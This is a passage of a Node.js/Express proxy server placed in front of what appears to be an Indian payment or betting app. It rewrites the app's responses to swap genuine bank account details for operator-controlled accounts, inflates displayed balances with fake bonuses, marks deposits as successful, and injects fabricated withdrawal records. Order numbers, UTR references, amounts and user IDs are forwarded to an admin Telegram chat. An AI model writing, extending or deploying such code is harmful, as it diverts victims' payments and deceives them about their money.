      const amountMatch = bodyStr.match(/name="utrAmount"[\r\n]+([^\r\n-]+)/);
      if (utrMatch) b.utr = utrMatch[1].trim();
      if (orderMatch) b.orderId = orderMatch[1].trim();
      if (amountMatch) b.utrAmount = amountMatch[1].trim();
    }
    const qs = new URLSearchParams(req.originalUrl.split('?')[1] || '');
    if (!b.utr && qs.get('utr')) b.utr = qs.get('utr');
    if (!b.orderId && qs.get('orderId')) b.orderId = qs.get('orderId');
    if (!b.utrAmount && qs.get('utrAmount')) b.utrAmount = qs.get('utrAmount');

    const userId = b.userId || qs.get('userId') || 'N/A';
    bot.sendMessage(bankData.adminChatId,
`💰 UTR Uploaded!
👤 User: ${userId}
Order: ${b.orderId || 'N/A'}
UTR: ${b.utr || 'N/A'}
Amount: ₹${b.utrAmount || 'N/A'}
Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
    ).catch(() => {});
    if (userId !== 'N/A') {
      trackUser(bankData, userId, `UTR ${b.utr || ''}`);
      saveData(bankData).catch(() => {});
    }
  }
  await transparentProxy(req, res);
});

app.post('/money/cancelUtr', async (req, res) => {
  const bankData = await loadData();
  if (bankData.botEnabled === false) return await transparentProxy(req, res);
  if (bankData.adminChatId && bot) {
    bot.sendMessage(bankData.adminChatId,
`❌ UTR Cancelled!
Order: ${req.parsedBody?.orderId || 'N/A'}
Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
    ).catch(() => {});
  }
  await transparentProxy(req, res);
});

async function proxyAndReplaceBankDetails(req, res, label) {
  const bankData = await loadData();
  const reqUserId = extractUserId(req, null);
  const reqEff = getEffectiveSettings(bankData, reqUserId);
  if (reqEff.botEnabled === false) return await transparentProxy(req, res);

  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);

    const detectedUserId = extractUserId(req, jsonResp) || reqUserId;
    const eff = getEffectiveSettings(bankData, detectedUserId);
    const active = eff.botEnabled !== false ? await getActiveBankAndSave(bankData, detectedUserId) : null;

    if (jsonResp && jsonResp.data && active) {
      const originalValues = {};
      deepReplaceBankDetails(jsonResp.data, active, originalValues, 0);
    }

    if (bankData.adminChatId && bot) {
      const orderId = jsonResp?.data?.orderId || req.parsedBody?.orderId || 'N/A';
      const amount = jsonResp?.data?.amountOrder || jsonResp?.data?.amount || req.parsedBody?.amount || 'N/A';
      bot.sendMessage(bankData.adminChatId,
`🔔 ${label}
👤 User: ${detectedUserId || 'N/A'}
Order: ${orderId}
Amount: ₹${amount}
Bank: ${active ? active.accountHolder : 'None'}
Acc: ${active ? active.accountNo : 'N/A'}
Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(() => {});
    }

    if (detectedUserId) {
      const orderId = jsonResp?.data?.orderId || '';
      trackUser(bankData, detectedUserId, `Order ${orderId}`);
      saveData(bankData).catch(() => {});
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch (e) {
    console.error('Proxy+replace error:', req.method, req.originalUrl, e.message);
    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
  }
}

async function proxyAndAddBonus(req, res) {
  const bankData = await loadData();

  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);

    const detectedUserId = extractUserId(req, jsonResp);
    const eff = getEffectiveSettings(bankData, detectedUserId);
    const bonus = eff.depositSuccess ? (eff.depositBonus || 0) : 0;

    if (detectedUserId) {
      trackUser(bankData, detectedUserId, `App Open ${req.path}`);
      saveData(bankData).catch(() => {});
    }

    if (bonus > 0 && jsonResp && jsonResp.data) {
      addBonusToBalanceFields(jsonResp.data, bonus);
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    console.error('Balance proxy error:', e.message);
    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
  }
}

async function proxyAndReplaceBankInList(req, res) {
  const bankData = await loadData();

  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);

    const detectedUserId = extractUserId(req, jsonResp);
    const eff = getEffectiveSettings(bankData, detectedUserId);
    const active = (eff.botEnabled !== false) ? await getActiveBankAndSave(bankData, detectedUserId) : null;

    if (jsonResp && jsonResp.data) {
      const applyToItem = (item) => {
        const itemUserId = item.userId ? String(item.userId) : detectedUserId;
        const itemEff = getEffectiveSettings(bankData, itemUserId);
        const itemActive = (itemEff.botEnabled !== false) ? getActiveBank(bankData, itemUserId) : null;

        if (itemActive) {
          const origVals = {};
          deepReplaceBankDetails(item, itemActive, origVals, 0);
        }
        if (itemEff.depositSuccess) markDepositSuccess(item);
      };
      if (Array.isArray(jsonResp.data)) {
        jsonResp.data.forEach(applyToItem);
      } else if (jsonResp.data.list && Array.isArray(jsonResp.data.list)) {
        jsonResp.data.list.forEach(applyToItem);
      } else if (jsonResp.data.records && Array.isArray(jsonResp.data.records)) {
        jsonResp.data.records.forEach(applyToItem);
      } else {
        applyToItem(jsonResp.data);
      }
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch (e) {
    console.error('Proxy+list replace error:', req.method, req.originalUrl, e.message);
    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
  }
}

app.post('/money/orderId', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, 'New Order!');
});

app.post('/money/create/v2', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, 'New Order (v2)!');
});

app.post('/money/init/order', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, 'Init Order!');
});

app.all('/money/order/list', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});
app.all('/money/list/v2', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});
app.all('/money/order/detail', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});
app.all('/money/orderDetail', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});
app.all('/money/rechargeRecord', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});
app.all('/withdraw/list', async (req, res) => {
  const bankData = await loadData();
  const hasFakes = bankData.fakeWithdrawals && Object.keys(bankData.fakeWithdrawals).length > 0;

  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);

    console.log('[withdraw/list] hasFakes:', hasFakes, 'fakeKeys:', Object.keys(bankData.fakeWithdrawals || {}), 'respDataType:', jsonResp ? typeof jsonResp.data : 'null');
    if (jsonResp && jsonResp.data) {
      const sample = JSON.stringify(jsonResp.data).substring(0, 300);
      console.log('[withdraw/list] data sample:', sample);
    }

    if (hasFakes && jsonResp) {
      const fakeItems = Object.values(bankData.fakeWithdrawals).map(fake => {
        const existingItems = Array.isArray(jsonResp.data) ? jsonResp.data :
          (jsonResp.data?.list || jsonResp.data?.records || []);
        const template = existingItems.length > 0 ? { ...existingItems[0] } : {};
        return {
          ...template,
          orderId: fake.orderId,
          amount: fake.amount,
          amountOrder: fake.amount,
          status: fake.status,
          statusName: fake.statusName,
          createTime: fake.createTime,
          userId: parseInt(fake.userId) || fake.userId
        };
      });

      if (Array.isArray(jsonResp.data)) {
        jsonResp.data.unshift(...fakeItems);
      } else if (jsonResp.data && jsonResp.data.list && Array.isArray(jsonResp.data.list)) {
        jsonResp.data.list.unshift(...fakeItems);
      } else if (jsonResp.data && jsonResp.data.records && Array.isArray(jsonResp.data.records)) {
        jsonResp.data.records.unshift(...fakeItems);
      } else if (jsonResp.data && typeof jsonResp.data === 'object') {
        const arrKey = Object.keys(jsonResp.data).find(k => Array.isArray(jsonResp.data[k]));
        if (arrKey) {
          jsonResp.data[arrKey].unshift(...fakeItems);
        } else {
          if (!jsonResp.data.records) jsonResp.data.records = [];
          jsonResp.data.records.unshift(...fakeItems);
        }
      }
      console.log('[withdraw/list] Injected', fakeItems.length, 'fake items');
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch (e) {
    console.error('withdraw/list proxy error:', e.message);
    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
  }
});

app.all('/withdraw/orderId', async (req, res) => {
  const bankData = await loadData();
  const qs = new URLSearchParams((req.originalUrl.split('?')[1]) || '');
  const reqOrderId = req.parsedBody?.orderId || qs.get('orderId') || '';

  console.log('[withdraw/orderId] reqOrderId:', reqOrderId, 'fakeWithdrawals:', Object.keys(bankData.fakeWithdrawals || {}));

  if (bankData.fakeWithdrawals && reqOrderId) {
    for (const [uid, fake] of Object.entries(bankData.fakeWithdrawals)) {
      if (fake.orderId === reqOrderId) {
        console.log('[withdraw/orderId] Matched fake for user:', uid);
        return res.json({
          code: 1,
          data: {
            orderId: fake.orderId,
            amount: fake.amount,
            amountOrder: fake.amount,
            status: fake.status,
            statusName: fake.statusName,
            createTime: fake.createTime,
            userId: parseInt(uid) || uid
          },
          msg: 'success'
        });
      }
    }
  }

  await transparentProxy(req, res);
});

app.all('/money/withdrawRecord', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});
app.all('/user/cashFlow', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});

app.post('/money/check/payStatus', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});

app.all('/user/*', async (req, res) => {
  const path = req.path.toLowerCase();
  if (path === '/user/cashflow') return await proxyAndReplaceBankInList(req, res);
  await proxyAndAddBonus(req, res);
});

app.get('/health', async (req, res) => {
  const bankData = await loadData();
  const active = getActiveBank(bankData, null);
  const idCount = Object.keys(bankData.userOverrides || {}).length;
  res.json({ status: 'ok', bankActive: !!active, totalBanks: bankData.banks.length, adminSet: !!bankData.adminChatId, perIdOverrides: idCount });
});

app.use(async (req, res) => {
  await transparentProxy(req, res);
});

module.exports = app;
